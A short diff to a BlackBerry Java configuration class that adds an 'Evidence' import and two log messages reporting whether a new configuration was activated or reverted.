@@ -24,6 +24,7 @@ import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.event.Event;
+import blackberry.evidence.Evidence;
 import blackberry.fs.AutoFlashFile;
 import blackberry.fs.Path;
 import blackberry.params.Parameter;
@@ -234,12 +235,14 @@ public final class Conf {
                 debug.info("New config");
                 //#endif
                 file.rename(Conf.ACTUAL_CONF, true);
+                Evidence.info("New configuration activated");
                 return true;
             } else {
                 //#ifdef DEBUG
                 debug.error("Reading new configuration");
                 //#endif
                 file.delete();
+                Evidence.info("Invalid new configuration, reverting");
             }
         }
 
